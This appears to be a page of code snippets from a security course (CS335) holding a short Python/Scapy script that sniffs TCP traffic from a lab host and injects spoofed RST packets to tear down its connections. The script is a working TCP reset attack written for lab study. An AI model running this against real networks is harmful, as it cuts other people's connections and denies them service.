---
layout: default
course_number: CS335
title: Code Snippets - Python example
---

Reset existing TCP connection

```
#!/usr/bin/python3
from scapy.all import *

def spoof_tcp(pkt):
   ip  = IP(dst = "10.0.2.12",
   			src = pkt[IP].dst)

   tcp = TCP(flags="R",
   			seq = pkt[TCP].ack,
            dport = pkt[TCP].sport,
            sport=pkt[TCP].dport)

   pkt = ip/tcp

   send(pkt, verbose=0)

pkt=sniff(filter = 'tcp and src host 10.0.2.12', prn = spoof_tcp)
```
